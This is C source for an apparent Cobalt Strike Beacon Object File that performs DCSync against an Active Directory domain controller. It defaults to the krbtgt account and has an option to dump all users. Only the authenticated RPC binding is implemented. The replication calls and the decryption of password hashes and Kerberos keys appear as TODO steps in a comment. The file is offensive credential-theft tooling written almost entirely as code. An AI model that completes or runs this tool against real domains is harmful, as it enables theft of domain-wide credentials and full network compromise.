/*
 * dcsync.c — DCSync via MS-DRSR (DRSGetNCChanges)
 *
 * Connects to target DC's DRSUAPI RPC endpoint and requests replication
 * of password data for specified user(s).
 *
 * Win32 APIs: rpcrt4.dll (RPC binding), drsuapi RPC interface
 */
#include <windows.h>
#include "beacon_compat.h"

/* RPC imports */
DECLSPEC_IMPORT RPC_STATUS RPC_ENTRY RPCRT4$RpcStringBindingComposeA(
    RPC_CSTR, RPC_CSTR, RPC_CSTR, RPC_CSTR, RPC_CSTR, RPC_CSTR*);
DECLSPEC_IMPORT RPC_STATUS RPC_ENTRY RPCRT4$RpcBindingFromStringBindingA(
    RPC_CSTR, RPC_BINDING_HANDLE*);
DECLSPEC_IMPORT RPC_STATUS RPC_ENTRY RPCRT4$RpcBindingSetAuthInfoExA(
    RPC_BINDING_HANDLE, RPC_CSTR, ULONG, ULONG, RPC_AUTH_IDENTITY_HANDLE, ULONG, void*);
DECLSPEC_IMPORT RPC_STATUS RPC_ENTRY RPCRT4$RpcBindingFree(RPC_BINDING_HANDLE*);
DECLSPEC_IMPORT RPC_STATUS RPC_ENTRY RPCRT4$RpcStringFreeA(RPC_CSTR*);

/* Kernel32 imports */
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$GetComputerNameExW(int, LPWSTR, LPDWORD);
DECLSPEC_IMPORT int  WINAPI KERNEL32$WideCharToMultiByte(UINT, DWORD, LPCWCH, int, LPSTR, int, LPCCH, LPBOOL);

DECLSPEC_IMPORT int __cdecl MSVCRT$snprintf(char*, size_t, const char*, ...);
DECLSPEC_IMPORT char* __cdecl MSVCRT$strncpy(char*, const char*, size_t);

/*
 * DRSUAPI interface UUID: e3514235-4b06-11d1-ab04-00c04fc2dcd2
 * Version 4.0
 */

/* DRSUAPI UUID */
static const unsigned char DRSUAPI_UUID[] = {
    0x35, 0x42, 0x51, 0xE3, 0x06, 0x4B, 0xD1, 0x11,
    0xAB, 0x04, 0x00, 0xC0, 0x4F, 0xC2, 0xDC, 0xD2
};

void go(char *args, int args_len) {
    datap parser;
    BeaconDataParse(&parser, args, args_len);

    char *domain = BeaconDataExtract(&parser, NULL);
    char *user = BeaconDataExtract(&parser, NULL);
    char *dc = BeaconDataExtract(&parser, NULL);
    int dump_all = BeaconDataInt(&parser);

    /* Auto-detect domain/DC if not specified */
    char aDomain[256] = {0};
    char aDC[256] = {0};
    if (!domain || !*domain) {
        DWORD size = 256;
        wchar_t wDomain[256];
        KERNEL32$GetComputerNameExW(ComputerNameDnsDomain, wDomain, &size);
        KERNEL32$WideCharToMultiByte(CP_UTF8, 0, wDomain, -1, aDomain, 256, NULL, NULL);
    } else {
        MSVCRT$strncpy(aDomain, domain, 255);
    }

    if (!dc || !*dc) {
        /* Use DsGetDcName to find a DC */
        /* TODO: resolve DC */
        BeaconPrintf(CALLBACK_ERROR, "[!] DC auto-discovery not yet implemented. Use --dc.\n");
        return;
    } else {
        MSVCRT$strncpy(aDC, dc, 255);
    }

    /* Default target: krbtgt */
    char targetUser[256] = "krbtgt";
    if (user && *user) {
        MSVCRT$strncpy(targetUser, user, 255);
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[*] DCSync: %s from %s (DC: %s)\n",
                 dump_all ? "ALL USERS" : targetUser, aDomain, aDC);

    /*
     * 1. Create RPC binding to DC's DRSUAPI endpoint
     */
    RPC_CSTR stringBinding = NULL;
    RPC_BINDING_HANDLE hBinding = NULL;

    char endpoint[512];
    MSVCRT$snprintf(endpoint, sizeof(endpoint), "ncacn_ip_tcp:%s[135]", aDC);

    RPC_STATUS rpcStatus = RPCRT4$RpcStringBindingComposeA(
        NULL,
        (RPC_CSTR)"ncacn_ip_tcp",
        (RPC_CSTR)aDC,
        NULL,  /* DRSUAPI uses dynamic endpoint via epmapper */
        NULL,
        &stringBinding
    );

    if (rpcStatus != RPC_S_OK) {
        BeaconPrintf(CALLBACK_ERROR, "[!] RpcStringBindingCompose failed: %d\n", rpcStatus);
        return;
    }

    rpcStatus = RPCRT4$RpcBindingFromStringBindingA(stringBinding, &hBinding);
    RPCRT4$RpcStringFreeA(&stringBinding);

    if (rpcStatus != RPC_S_OK) {
        BeaconPrintf(CALLBACK_ERROR, "[!] RpcBindingFromStringBinding failed: %d\n", rpcStatus);
        return;
    }

    /* Set auth to use current credentials (Kerberos/NTLM negotiate) */
    rpcStatus = RPCRT4$RpcBindingSetAuthInfoExA(
        hBinding,
        (RPC_CSTR)aDC,
        RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
        RPC_C_AUTHN_GSS_NEGOTIATE,
        NULL,  /* Current credentials */
        0, NULL
    );

    if (rpcStatus != RPC_S_OK) {
        BeaconPrintf(CALLBACK_ERROR, "[!] RpcBindingSetAuthInfo failed: %d\n", rpcStatus);
        RPCRT4$RpcBindingFree(&hBinding);
        return;
    }

    /*
     * 2. DRSBind — bind to the DRSUAPI interface
     * 3. DRSCrackNames — resolve sAMAccountName -> DN
     * 4. DRSGetNCChanges — replicate the user's attributes
     * 5. Decrypt unicodePwd and supplementalCredentials with session key
     * 6. Output NTLM hash and Kerberos keys
     *
     * TODO: Implement full DRSR RPC calls.
     */

    BeaconPrintf(CALLBACK_OUTPUT,
        "[*] RPC binding established to %s\n"
        "[!] Full DRSR protocol implementation pending\n"
        "[*] Required: DRSBind -> DRSCrackNames -> DRSGetNCChanges\n"
        "[*] Target: %s\\%s\n",
        aDC, aDomain, targetUser);

    /* Cleanup */
    RPCRT4$RpcBindingFree(&hBinding);
}
